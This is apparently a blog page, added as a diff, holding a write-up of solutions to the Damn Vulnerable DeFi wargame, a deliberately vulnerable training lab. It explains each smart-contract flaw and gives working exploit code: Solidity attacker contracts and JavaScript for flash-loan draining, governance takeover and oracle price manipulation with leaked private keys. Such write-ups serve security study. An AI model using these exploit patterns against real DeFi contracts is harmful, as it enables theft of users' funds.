@@ -1,0 +1,1044 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>[Solution] Damn Vulnerable DeFi | inhack</title>
+<meta name="keywords" content="solidity, smart contract, security, DeFi, wargame, CTF" />
+<meta name="description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions">
+<meta name="author" content="inhack">
+<link rel="canonical" href="https://inhack.github.io/posts/solution-damn-vulnerable-defi/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css" integrity="sha256-yIlj/i15RiAA/Q&#43;xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://inhack.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://inhack.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://inhack.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://inhack.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://inhack.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.88.1" />
+<link rel="alternate" hreflang="en" href="https://inhack.github.io/posts/solution-damn-vulnerable-defi/" />
+<link rel="alternate" hreflang="kr" href="https://inhack.github.io/kr/posts/solution-damn-vulnerable-defi/" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="[Solution] Damn Vulnerable DeFi" />
+<meta property="og:description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://inhack.github.io/posts/solution-damn-vulnerable-defi/" /><meta property="og:image" content="https://inhack.github.io/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-11T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-01-11T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://inhack.github.io/papermod-cover.png"/>
+
+<meta name="twitter:title" content="[Solution] Damn Vulnerable DeFi"/>
+<meta name="twitter:description" content="Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://inhack.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "[Solution] Damn Vulnerable DeFi",
+      "item": "https://inhack.github.io/posts/solution-damn-vulnerable-defi/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[Solution] Damn Vulnerable DeFi",
+  "name": "[Solution] Damn Vulnerable DeFi",
+  "description": "Damn Vulnerable DeFi(The offensive security playground for decentralized finances) Solutions",
+  "keywords": [
+    "solidity", "smart contract", "security", "DeFi", "wargame", "CTF"
+  ],
+  "articleBody": " ‘Damn Vulnerable DeFi’ is an offensive security playground for decentralized finances.\nThis article offers a brief summary and exploit code of each challenge.\nFor detailed source code and contents, please check my github repository.\n # 1. Unstoppable Summary Flash Loan을 제공하고 있는 Lending Pool을 대상으로 DoS 공격을 통해 기능을 멈추게하는 것이 목표이다.\nFlash Loan?\n Flash Loan은 간단하게 설명하자면 ‘무담보’ 대출로, 보통 사용자는 대출 풀에 소정의 수수료를 지급하고(물론 트랜잭션 실행에 대한 가스비도 소모) 토큰을 대출할 수 있다.\n대출한 토큰을 가지고 다른 DeFi 서비스에 투자를 하던, 에어드랍 보상을 위한 스테이킹을 하던, 사용자가 상환 이전까지 사용할 수 있다.\n하지만 Flash Loan의 대출-상환 프로세스는 ‘단일’ 트랜잭션에서 이루어져야 하며, 상환 과정에서 대출받은 토큰만큼의 수량을 Pay Back하지 않는 경우 해당 트랜잭션이 revert된다.\nrevert가 된다는 것은 해당 트랜잭션이 블록에 포함되지 않아 PoW/PoS 등의 거래증명이 완료되지 않기 때문에, State Transition이 발생하지 않는다.\n말이 어려운데 그냥 원금을 돌려놓지 않으면, 대출-상환 사이에 토큰을 옮기든 무엇을 하든 트랜잭션 revert로 인해 대출 실행 이전의 상태로 원복된다는 것이다.(수수료나 가스비만 소모)\n 이더리움에서는 계정(컨트랙트 및 EOA)을 대상으로 강제로 Ether를 송신할 수 있으므로\nuint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore = borrowAmount, \"Not enough tokens in pool\"); // Ensured by the protocol via the `depositTokens` function assert(poolBalance == balanceBefore); 와 같이 컨트랙트의 balance를 엄격하게 확인하는 코드를 작성하는 경우에 주의해야 한다.\n위 코드로 인해 Lending Pool의 계좌 잔액이 1 wei만 늘어나더라도, assert()에 의해 이후의 코드가 실행되지 않는 DoS 상태로 빠질 수 있다.\nExploit unstoppable.challenge.js\nawait this.token.connect(attacker).transfer(this.pool.address, 1); // forcibly send 1 wei to lending pool  # 2. Naive receiver Summary Flash Loan을 제공하는 Lending Pool에서 대출 수수료로 1 ETH를 청구한다. 해당 Lending Pool을 이용하는 특정 사용자의 balance(10 ETH)를 drain하는 것이 목표이다.\n// NaiveReceiverLenderPool.sol ... // msg.sender가 borrower인지 검증하는 로직이 없음 - 공격자가 임의의 사용자의 컨트랙트에 있는 잔고를 고갈시킬 수 있음(수수료 사용) function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant { // (1) Flash Loan 컨트랙트의 잔액이 borrowAmount에 비해 충분한지 확인  uint256 balanceBefore = address(this).balance; require(balanceBefore = borrowAmount, \"Not enough ETH in pool\"); // (2) 대출자인 borrower가 컨트랙트인지 확인(not EOA)  require(borrower.isContract(), \"Borrower must be a deployed contract\"); // borrower.receiveEther() 호출  // Transfer ETH and handle control to receiver  borrower.functionCallWithValue( abi.encodeWithSignature( \"receiveEther(uint256)\", FIXED_FEE ), borrowAmount ); require( address(this).balance = balanceBefore + FIXED_FEE, \"Flash loan hasn't been paid back\" ); } ... 위 코드를 보면 확인할 수 있듯이, flashLoan() 을 호출하여 대출을 실행하는 사용자인 msg.sender가 borrower인지 검증하는 로직이 없어, 공격자가 임의의 사용자 주소를 borrower에 입력하여 호출이 가능하다.\nExploit naive-receiver.challenge.js\nfor(let i=0;i10;i++){ await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0')); }  # 3. - Truster Summary Flash Loan을 기반으로 DTV 토큰을 무료로 대출해주는 Lending Pool이 있으며, 해당 Lending Pool은 100만개의 DTV 토큰을 가지고 있다. 해당 Lending Pool로부터 모든 DTV 토큰을 공격자의 계정으로 옮기는 것이 목표이다.\n... // functionCall()을 이용하여 target 컨트랙트의 및 특정 함수를 호출하는 코드로 인해, 공격자는 어떠한 함수든 호출이 가능 function flashLoan( uint256 borrowAmount, address borrower, address target, bytes calldata data ) external nonReentrant { uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); require(balanceBefore = borrowAmount, \"Not enough tokens in pool\"); damnValuableToken.transfer(borrower, borrowAmount); target.functionCall(data); // Vulnerable : target 및 data를 이용해 함수 호출 - 어떠한 함수든 호출이 가능한 상황  uint256 balanceAfter = damnValuableToken.balanceOf(address(this)); require(balanceAfter = balanceBefore, \"Flash loan hasn't been paid back\"); } ... target.functionCall(data); 에 의해 현재 어떠한 함수든 사용자가 호출이 가능한 상황이다.\nrequire(balanceAfter = balanceBefore, \"Flash loan hasn't been paid back\"); 구문 우회를 위해, approve() 함수를 호출하도록하여 Lending Pool-공격자로 토큰 전송을 승인해두고 flashLoan() 호출 이후에 transferFrom()을 이용해 Lending Pool의 모든 토큰을 공격자의 계정으로 가져올 수 있다.\nExploit truster.challenge.js\nconst ABI = [\"function approve(address, uint256)\"]; const interface = new ethers.utils.Interface(ABI); const payload = interface.encodeFunctionData(\"approve\", [attacker.address, TOKENS_IN_POOL.toString()]); await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, payload); // token.approve() : lending pool - attacker await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);  # 4. Side entrance Summary 누구나,언제든 ETH를 예치/인출할 수 있는 Lending Pool이 있다.\n해당 Lending Pool은 1,000 ETH의 balance를 가지고 있으며, 프로모션으로 예치된 ETH를 자유롭게 대출할 수 있는 Flash Loan 서비스를 제공하고 있다.\n공격자는 해당 Lending Pool로부터 모든 ETH를 가져와야 한다.\n// SideEntranceLenderPool contract SideEntranceLenderPool { using Address for address payable; mapping (address = uint256) private balances; // ETH deposit(예치) 기능 제공  // Vulnerable : ETH 수신 여부와 상관없이 balance를 증가시킴  function deposit() external payable { balances[msg.sender] += msg.value; } // ETH withdraw(인출) 기능 제공  function withdraw() external { uint256 amountToWithdraw = balances[msg.sender]; balances[msg.sender] = 0; payable(msg.sender).sendValue(amountToWithdraw); } /** * @notice Flash Loan 기능으로 사용자에게 원하는 만큼의 ETH를 대출 * @param amount 대출할 ETH의 수량 * @dev 대출을 요청한 사용자 컨트랙트의 execute() 함수를 호출 - execute */ function flashLoan(uint256 amount) external { uint256 balanceBefore = address(this).balance; require(balanceBefore = amount, \"Not enough ETH in balance\"); IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); require(address(this).balance = balanceBefore, \"Flash loan hasn't been paid back\"); } } 대출을 요청한 사용자 컨트랙트의 execute() 함수를 실행하며, msg.value를 통해 대출한 ETH 토큰을 전달한다.\ndeposit() 함수는 ETH를 사용자에게 수신했는지 여부와 상관없이 balance를 증가시키도록 취약한 형태로 작성되어 있다.\n공격자는 내부적으로 deposit()을 호출하여 대출한 ETH를 Lending Pool에 예치하는 execute() 함수 및 컨트랙트를 호출한 뒤, flashLoan() 실행이 종료된 이후에 withdraw()를 통해 ETH를 가져올 수 있다.\n (1) flashLoan()을 통해 대출한 ETH를 다시 deposit()하여 공격자의 balances를 증가시킨다.  deposit()이 예치한 사용자의 ETH 전송 여부는 확인하지 않기 때문에, 대출한 토큰으로 balances만 증가시키고 다시 상환   (2) 공격자는 withdraw()를 호출하여 Lending Pool의 ETH를 가져온다.  Exploit attacker-contracts/FlashLoanEtherReceiver.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \"../side-entrance/SideEntranceLenderPool.sol\"; contract FlashLoanEtherReceiver { SideEntranceLenderPool private immutable pool; address payable private immutable attacker; constructor(address payable poolAddress, address payable attackerAddress) { pool = SideEntranceLenderPool(poolAddress); attacker = attackerAddress; } function execute() external payable { pool.deposit{value: msg.value}(); } function executeFlashLoan() external { // attack - increase attacker's balances  pool.flashLoan(address(pool).balance); pool.withdraw(); // send drained ether to attacker  attacker.transfer(address(this).balance); } // Allow deposits of ETH  receive () external payable {} } side-entrance.challenge.js\nconst FlashLoanEtherReceiver = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker); this.receiver = await FlashLoanEtherReceiver.deploy(this.pool.address, attacker.address); await this.receiver.executeFlashLoan();  # 5. The rewarder Summary DTV 토큰을 예치한 사용자에게 5일마다 한번씩 리워드 토큰을 보상해주는 Reward Pool이 있다. (라운드마다 100개의 리워드 토큰을 보상하며, 예치한 비율에 따라 분배)\n현재 Alice, Bob, Charile, David 4명이 사용자가 각각 100개의 DTV 토큰을 예치한 상태이며, Reward Round 2에서 각각 25개씩의 Reward를 수령하였다.\n공격자는 DTV 토큰을 하나도 가지고 있지 않은 상태에서, Reward Round 3에서 가장 많은 Reward Token을 수령하는 것이 목표이다.\n100만개의 DTV 토큰을 보유하고 있는 FlashLoanderPool로부터 대출받은 토큰을 Reward Pool에 예치하여 리워드 토큰을 수령하면 된다.\nExploit attacker-contracts/FlashLoanTheRewarder.sol\n// SPDX-License-Identifier: MIT  pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; interface IFlashLoanerPool { function flashLoan(uint256 amount) external; } interface IDamnValuableToken { function approve(address spender, uint256 amount) external returns (bool); function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } interface IRewarderPool { function deposit(uint256 amountToDeposit) external; function withdraw(uint256 amountToWithdraw) external; function distributeRewards() external returns (uint256); } interface IRewardToken { function transfer(address recipient, uint256 amount) external returns (bool); function balanceOf(address) external returns (uint256); } contract FlashLoanTheRewarder { using Address for address payable; address payable private lenderPool; //address payable private liquidityToken;  address payable private rewarderPool; address payable private attacker; address payable private rewardToken; address payable private liquidityToken; uint256 public testUint; constructor (address payable _lenderPool, address payable _liquidityToken, address payable _rewardToken, address payable _rewarderPool, address payable _attacker) { lenderPool = _lenderPool; //liquidityToken = _liquidityToken;  liquidityToken = _liquidityToken; rewarderPool = _rewarderPool; rewardToken = _rewardToken; attacker = _attacker; } function receiveFlashLoan(uint256 amount) external { require(msg.sender == lenderPool, \"Sender must be pool\"); // Flashloan Borrow : Receive liquidity token(DTV) from LenderPool(flashloan)  uint256 amountToBeRepaid = amount; IDamnValuableToken(liquidityToken).approve(rewarderPool, amountToBeRepaid); IRewarderPool(rewarderPool).deposit(amountToBeRepaid); IRewarderPool(rewarderPool).withdraw(amountToBeRepaid); // Flashloan Repayment : Pay back to LenderPool(flashloan)  IDamnValuableToken(liquidityToken).transfer(lenderPool, amountToBeRepaid); } function execFlashLoans(uint256 amount) external { IFlashLoanerPool(lenderPool).flashLoan(amount); IRewardToken(rewardToken).transfer( msg.sender, IRewardToken(rewardToken).balanceOf(address(this)) ); } receive () external payable {} } the-rewarder.challenge.js\nconst FlashLoanTheRewarder = await ethers.getContractFactory('FlashLoanTheRewarder', attacker); this.attackerContract = await FlashLoanTheRewarder.deploy(this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address, this.rewarderPool.address, attacker.address); // Next Reward Round! await ethers.provider.send(\"evm_increaseTime\", [5 * 24 * 60 * 60]); // 5 days  await this.attackerContract.execFlashLoans(ethers.utils.parseEther('1000000')); //console.log(await this.attackerContract.check()); console.log(await this.rewarderPool.roundNumber()); // for (let i = 0; i // console.log(await this.rewardToken.balanceOf(users[i].address)); // } console.log(await this.rewardToken.balanceOf(attacker.address));  # 6. Selfie Summary Flash Loan을 제공하며 거버넌스 메커니즘을 기반으로 제어가 가능한 150만개의 DTV 토큰을 보유하고 있는 Lending Pool이 있다.\n공격자는 0개의 DTV 토큰을 가지고 있으며, 해당 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이다.\n// SelfiePool.sol ... /** * @notice 컨트랙트(펀드)에 있는 모든 토큰 잔액을 해당 주소로 전송 (governance만 해당 함수 호출 가능) * @param receiver 모든 토큰 잔액을 전송할 대상 주소 */ function drainAllFunds(address receiver) external onlyGovernance { uint256 amount = token.balanceOf(address(this)); token.transfer(receiver, amount); emit FundsDrained(receiver, amount); } ... Flash Loan 컨트랙트에는 거버넌스만이 실행할 수 있으며 지정된 계정으로 모든 토큰을 보내는 drainAllFunds() 함수를 제공하고 있다.\n// SimpleGovernance.sol ... /** * @notice 거버넌스 큐에 실행할 작업을 적재 * @param receiver 작업을 실행할 컨트랙트의 주소 * @param data 작업에 사용할 calldata(함수 이름, 인자 등) * @return 큐에 적재된 작업의 식별자(actionId) */ function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) { require(_hasEnoughVotes(msg.sender), \"Not enough votes to propose an action\"); // 큐에 작업을 추가하기 위해서는 전체 토큰 발행량의 절반 이상을 가지고 있어야 함  require(receiver != address(this), \"Cannot queue actions that affect Governance\"); // governance 컨트랙트 내 함수는 실행하지 못함  uint256 actionId = actionCounter; GovernanceAction storage actionToQueue = actions[actionId]; actionToQueue.receiver = receiver; actionToQueue.weiAmount = weiAmount; actionToQueue.data = data; actionToQueue.proposedAt = block.timestamp; // 작업이 큐에 적재된 시간(timestamp)  actionCounter++; emit ActionQueued(actionId, msg.sender); return actionId; } ... /** * @notice 거버넌스 큐에 적재된 작업 실행 * @param actionId 실행할 작업의 식별자(actionId) */ function executeAction(uint256 actionId) external payable { // _canBeExecuted()에 의해 (1) 아직 실행된 적이 없고(executedAt==0), (2) 큐에 적재된지 2일 이상이 지난 작업만 실행 가능  require(_canBeExecuted(actionId), \"Cannot execute this action\"); GovernanceAction storage actionToExecute = actions[actionId]; actionToExecute.executedAt = block.timestamp; actionToExecute.receiver.functionCallWithValue( actionToExecute.data, // address target  actionToExecute.weiAmount // bytes memory data  ); emit ActionExecuted(actionId, msg.sender); } 해당 거버넌스 메커니즘은 총 200만개가 발행된 DTV 토큰 중에서, 100만개를 초과한 토큰을 가진 계정만이 Lending Pool을 제어할 수 있는 action을 queue에 삽입할 수 있다.\nFlash Loan으로부터 150만개의 토큰(총 발행량의 과반이 넘는 토큰양)을 대출한 뒤, 거버넌스 큐에 drainAllFunds() 함수를 실행하는 action을 삽입한다.\n이후 queue에 있는 action을 실행하여 Lending Pool의 모든 토큰을 공격자의 계정으로 옮길 수 있다.\nExploit SelfiePool.sol\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"@openzeppelin/contracts/utils/Address.sol\"; interface IDamnValuableToken { function transfer(address recipient, uint256 amount) external; function transferFrom(address sender, address recipient, uint256 amount) external; function approve(address spender, uint256 amount) external; function balanceOf(address account) external returns (uint256); } interface IDamnValuableTokenSnapshot { function snapshot() external returns (uint256); function getBalanceAtLastSnapshot(address account) external view returns (uint256); function getTotalSupplyAtLastSnapshot() external view returns (uint256); } interface ISimpleGovernance { function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256); function executeAction(uint256 actionId) external payable; function getActionDelay() external view returns (uint256); } interface ISelfiePool { function flashLoan(uint256 borrowAmount) external; function drainAllFunds(address receiver) external; } contract FlashLoanSelfie { using Address for address payable; address payable public attacker; address payable public token; address payable public governance; address payable public lenderPool; uint256 public actId; constructor (address payable _attacker, address payable _token, address payable _governance, address payable _lenderPool) { attacker = _attacker; token = _token; governance = _governance; lenderPool = _lenderPool; } function receiveTokens(address _tokenAddress, uint256 _borrowAmount) external { // Flash loan borrow  IDamnValuableTokenSnapshot(_tokenAddress).snapshot(); actId = ISimpleGovernance(governance).queueAction(lenderPool, abi.encodeWithSignature(\"drainAllFunds(address)\", attacker), 1); // Flash loan repayment : pay back to flash loan  IDamnValuableToken(_tokenAddress).transfer(lenderPool, _borrowAmount); } function executeFlashLoans(uint256 _amount) external { ISelfiePool(lenderPool).flashLoan(_amount); } receive() external payable {} } selfie.challenge.js\nconst FlashLoanSelfieFactory = await ethers.getContractFactory('FlashLoanSelfie', attacker); this.exploit = await FlashLoanSelfieFactory.deploy(attacker.address, this.token.address, this.governance.address, this.pool.address); await this.exploit.connect(attacker).executeFlashLoans(ethers.utils.parseEther(\"1500000\")); await ethers.provider.send(\"evm_increaseTime\", [2 * 24 * 60 * 60]); // 2 days  await this.governance.executeAction(0);  # 7. Compromised Summary “DVNFT\"라는 NFT를 거래하는 마켓이 있으며, 해당 NFT는 개당 999 ETH에 판매되고 있다.\nNFT의 판매 가격은 3개의 Trusted Reporter가 설정한 가격의 median 값을 사용하고 있다.\nNFT 마켓은 9900 ETH, 공격자는 0.1 ETH를 보유하고 있는 상황에서 마켓이 가진 모든 ETH를 가져오는 것이 목표이다.\n해당 마켓으로부터 다음과 같은 on-chain 데이터가 유출되었다.\nHTTP/2 200 OK content-type: text/html content-language: en vary: Accept-Encoding server: cloudflare 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 유출된 두개의 데이터는 2개의 Trusted Reporter 계정의 개인키(Private Key)이므로, 해당 개인키를 이용해 NFT 마켓의 NFT 가격을 낮게 설정하는 트랜잭션을 송신함으로써 시세 조작이 가능하다.\n// TrustfulOracle.sol ... function _computeMedianPrice(string memory symbol) private view returns (uint256) { uint256[] memory prices = _sort(getAllPricesForSymbol(symbol)); // calculate median price if (prices.length % 2 == 0) { uint256 leftPrice = prices[(prices.length / 2) - 1]; uint256 rightPrice = prices[prices.length / 2]; return (leftPrice + rightPrice) / 2; } else { return prices[prices.length / 2]; } } ... Trusted Reporter가 설정한 가격을 통해, 홀수인 경우 prices[prices.length / 2]와 같이 median price를 계산한다.\n공격자는 3개중 2개의 개인키를 가지고 있기 때문에, 원하는대로 median price를 조작하는 것이 가능하다.\nExploit compromised.challenge.js\n// load wallet/signer from Private Key  // Leaked Hex Data - Base64Decode // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35 let privKey1 = \"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9\"; var wallet1 = new ethers.Wallet(privKey1, ethers.provider); // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34 let privKey2 = \"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48\"; var wallet2 = new ethers.Wallet(privKey2, ethers.provider); // Makret Manipulation (Price to low) await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0.01\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"0.01\")); // buy await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther(\"0.01\")}); // Makret Manipulation (Price to high) await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"9990.01\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"9990.01\")); console.log(await this.oracle.getAllPricesForSymbol(\"DVNFT\")); console.log(await this.oracle.getMedianPrice(\"DVNFT\")); // approve \u0026 sell await this.nftToken.connect(attacker).approve(this.exchange.address, 0); await this.exchange.connect(attacker).sellOne(0); // price recovery await this.oracle.connect(wallet1).postPrice(\"DVNFT\", ethers.utils.parseEther(\"999\")); await this.oracle.connect(wallet2).postPrice(\"DVNFT\", ethers.utils.parseEther(\"999\"));  # 8. Puppet Summary 100,000 DTV 토큰을 보유한 Lending Pool로부터 모든 토큰을 가져오는 것이 목표이며, 공격자는 25 ETH / 1,000 DTV를 가지고 있는 상태로 시작한다.\nUniswap V1을 기반으로 구축된 Puppet Pool DEX(DEcentralized eXchange)가 있으며, 10 DTV / 10 ETH 의 초기 유동성이 공급되고 있다.\n100,000 DTV 토큰을 보유하고 담보 대출을 해주는 Lending Pool이 있으며, Uniswap V1의 AMM(CPMM, Constants Product Market Maker)을 Price Oracle로 사용하고 있다.\n 정확히는 Uniswap V1에서 받아오는 Price Oracle의 x2 가격을 담보로 설정하여 DTV 토큰을 대출해준다. 초기 Uniswap V1의 유동성은 10 DTV / 10 ETH이기 때문에, CPMM에 의해 Price Oracle은 1이며, Lending Pool로부터 1 DTV를 대출하려면 2 ETH를 담보로 전송해야 한다.  공격자는 자신이 가진 DTV를 Uniswap V1 Pool에 있는 ETH와 Swap하여 Price Oracle 즉 DTV 토큰의 상대적인 가격을 임의로 낮출 수 있다. (1 DTV 당 대출에 필요한 ETH 가격이 낮아짐)\n CPMM 기반 Uniswap V1 Pool에 충분한 유동성이 공급되지 않는 경우, 토큰의 가격을 조작할 수 있다. (안정적인 가격 유지를 위해 충분한 유동성이 공급되어야 한다.)\n Exploit puppet.challenge.js\nawait this.token.connect(attacker).approve(this.uniswapExchange.address, ethers.utils.parseEther(\"990\")); await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(ethers.utils.parseEther(\"990\"), ethers.utils.parseEther(\"1\"), (await ethers.provider.getBlock('latest')).timestamp * 2, attacker.address); let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther(\"1\"))); let numOfEths = priceOracle.mul(100000).add(1); await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\"100000\"), {value: numOfEths});  # 9. Puppet v2 Summary Puppet과 동일하게 적은 유동성에 따른 토큰 가격 조작에 대한 위험이 있으며, Uniswap V2 업데이트에 따른 인터페이스(Wrapped ETH, Swap Router Path 등)만 맞춰주면 된다.\nExploit puppet-v2.challenge.js\n// Swap DTV - ETH let stamp = (await ethers.provider.getBlock('latest')).timestamp * 2; await this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.utils.parseEther(\"9999\")); await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther(\"9999\"), ethers.utils.parseEther(\"1\"), [this.token.address, this.weth.address], attacker.address, stamp); // lending! // attacker eth - weth convert let priceOracle = ethers.BigNumber.from(await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther(\"1\"))); let numOfWeths = priceOracle.mul(1000001) await this.weth.connect(attacker).deposit({value: numOfWeths}); await this.weth.connect(attacker).approve(this.lendingPool.address, numOfWeths); // steal! await this.lendingPool.connect(attacker).borrow(ethers.utils.parseEther(\"1000000\"));  # 10. Free rider TBU\n # 11. Backdoor TBU\n # 12. Climber TBU\n",
+  "wordCount" : "2695",
+  "inLanguage": "en",
+  "datePublished": "2022-01-11T00:00:00Z",
+  "dateModified": "2022-01-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "inhack"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://inhack.github.io/posts/solution-damn-vulnerable-defi/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "inhack",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://inhack.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://inhack.github.io/" accesskey="h" title="inhack (Alt + H)">inhack</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
